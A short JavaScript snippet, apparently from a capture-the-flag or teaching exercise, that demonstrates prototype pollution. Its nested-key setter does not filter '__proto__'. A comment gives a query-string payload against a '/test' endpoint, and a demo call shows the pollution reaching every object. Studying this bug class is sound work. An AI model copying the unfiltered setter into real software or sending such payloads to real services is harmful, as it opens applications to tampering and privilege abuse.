function isObject(obj) {
	return obj !== null && typeof obj === 'object';
  }
  
  function setValue(obj, key, value) {
	const keylist = key.split('.');
	const e = keylist.shift();
	if (keylist.length > 0) {
	  if (!isObject(obj[e])) obj[e] = {};
	  setValue(obj[e], keylist.join('.'), value);
	} else {
	  obj[key] = value;
	  return obj;
	}
  }
  // /test?func=rename&filename=filename.__proto__&rename=flag
  const obj1 = {};
  setValue(obj1, "__proto__.polluted", 1);
  const obj2 = {};
  console.log(obj2.polluted);